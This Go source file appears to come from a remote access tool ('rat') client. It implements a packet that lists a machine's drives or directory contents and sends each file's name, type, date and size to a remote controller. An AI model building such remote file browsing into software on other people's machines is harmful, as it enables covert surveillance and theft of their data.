package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"rat/client/drives"
	"rat/common"
)

type DirectoryPacket struct {
	Path string
}

func (packet DirectoryPacket) GetHeader() common.PacketHeader {
	return common.DirectoryHeader
}

func (packet DirectoryPacket) Write(c *Connection) error {
	var files []os.FileInfo
	var err error

	if packet.Path == "" {
		drives.QueryDrives()
		files = drives.Drives
	} else {
		files, err = ioutil.ReadDir(packet.Path)
	}

	if err != nil {
		fmt.Println(err.Error())
	}

	c.WriteInt(len(files))

	for i := 0; i < len(files); i++ {
		file := files[i]
		dir := file.IsDir()
		c.WriteBool(dir)
		c.WriteString(file.Name())

		t := file.ModTime()
		c.WriteString(t.Format("2006-01-02 15:04:05"))

		if !dir {
			c.WriteInt64(file.Size())
		}
	}

	return nil
}

func (packet DirectoryPacket) Read(c *Connection) error {
	path, err := c.ReadString()
	go func() {
		Queue <- DirectoryPacket{path}
	}()
	return err
}
